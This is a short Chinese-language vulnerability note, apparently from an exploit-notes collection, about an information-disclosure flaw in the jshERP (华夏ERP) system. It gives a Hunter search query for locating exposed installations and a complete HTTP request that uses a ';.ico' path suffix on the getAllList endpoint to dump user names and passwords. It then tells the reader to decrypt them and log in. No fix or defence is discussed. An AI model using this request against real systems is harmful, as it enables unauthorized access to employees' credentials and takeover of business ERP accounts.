# 华夏ERP getAllList存在信息泄露漏洞

# 一、漏洞简介
jshERP立志为中小企业提供开源好用的ERP软件，降低企业的信息化成本，目前专注进销存+财务功能。主要模块有零售管理、入库管理、出库管理、组装拆卸、财务管理、报表查询、基础数据、系统管理等。支持预付款、收入支出、仓库调拨、采购销售、礼品卡等特色功能。拥有库存状况、出入库统计等报表。同时对角色和权限进行了细致全面，精确到每个按钮和菜单。该系统存在敏感信息泄露漏洞，通过此漏洞攻击者可以获取系统用户，登录用户名，密码，职位等个人敏感信息。

# 二、影响版本
+ jshERP

# 三、资产测绘
+ Hunter`web.body="jshERP"`
+ 特征

![1704276326167-84de47c7-5c90-4441-9814-5a3cbf02f2f6.png](./img/taahvRvbAHDcrLXX/1704276326167-84de47c7-5c90-4441-9814-5a3cbf02f2f6-359942.png)

# 四、漏洞复现
```plain
GET /jshERP-boot/user/getAllList;.ico HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1704276087; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1704276315
Upgrade-Insecure-Requests: 1
```

![1704276423442-010d25cc-0516-4888-985c-fc04aa5c1904.png](./img/taahvRvbAHDcrLXX/1704276423442-010d25cc-0516-4888-985c-fc04aa5c1904-335255.png)

解密即可登录

![1704276460771-27d3c0fa-c153-490e-8592-0e2c6390e581.png](./img/taahvRvbAHDcrLXX/1704276460771-27d3c0fa-c153-490e-8592-0e2c6390e581-927135.png)



> 更新: 2024-02-29 23:55:42  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/grwzu7s9grkulo1a>